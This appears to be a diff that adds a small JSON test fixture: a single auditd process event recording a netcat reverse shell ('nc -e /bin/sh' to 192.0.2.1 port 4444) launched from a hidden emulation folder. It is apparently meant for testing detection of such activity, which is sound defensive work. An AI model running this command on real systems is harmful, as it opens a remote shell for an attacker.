@@ -1,0 +1,11 @@
+[
+ {
+  "source": "auditd",
+  "image": "/home/alice/.bk-emul-nc.12345/nc",
+  "commandLine": "nc -w 1 -e /bin/sh 192.0.2.1 4444",
+  "user": "1000",
+  "pid": 12328,
+  "ppid": 12200,
+  "currentDirectory": "/home/alice"
+ }
+]
